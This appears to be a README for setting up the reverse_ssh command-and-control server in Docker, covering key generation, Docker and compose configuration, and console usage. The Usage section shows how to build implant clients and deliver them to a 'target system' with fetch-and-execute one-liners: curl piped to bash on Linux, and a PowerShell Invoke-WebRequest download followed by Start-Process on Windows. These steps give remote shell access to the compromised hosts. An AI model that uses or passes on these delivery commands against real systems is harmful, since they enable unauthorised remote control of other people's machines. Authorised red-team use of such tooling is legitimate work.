# Requirements

- Server

# Setup

- clone the repository
```
https://github.com/NHAS/reverse_ssh.git
```

- Generate a new SSH key pair
```
ssh-keygen -t rsa -b 4096 -C "email@gmail.com"
```

- Get the ip of your server
```
ip a
```

- run the docker script with the ip of the server on the port 3232
```
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat $HOME/.ssh/id_rsa.pub)" -v ./data:/data reversessh/reverse_ssh
```

- alternative is to run docker compose
```
services:
  reversessh:
    image: reversessh/reverse_ssh
    ports:
      - "3232:2222"
    environment:
      - EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232
      - RSSH_CONSOLE_LABEL=c2.label
      - RSSH_LOG_LEVEL=INFO # DISABLED, INFO, WARNING, ERROR, FATAL
      - SEED_AUTHORIZED_KEYS=${SSH_PUBLIC_KEY}
    volumes:
      - ./data:/data
```

# Usage

```
# Connect to the server console
ssh your.rssh.server.internal -p 3232


# List all server console commands
catcher$ help

# Build a new client and host it on the in-built webserver
# For linux
catcher$ link

# curl or wget this binary to a target system then execute it,
curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh |  bash

# For windows
catcher$ link --goos windows

Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\test.exe 

# then we can then list what clients are connected
catcher$ ls
```
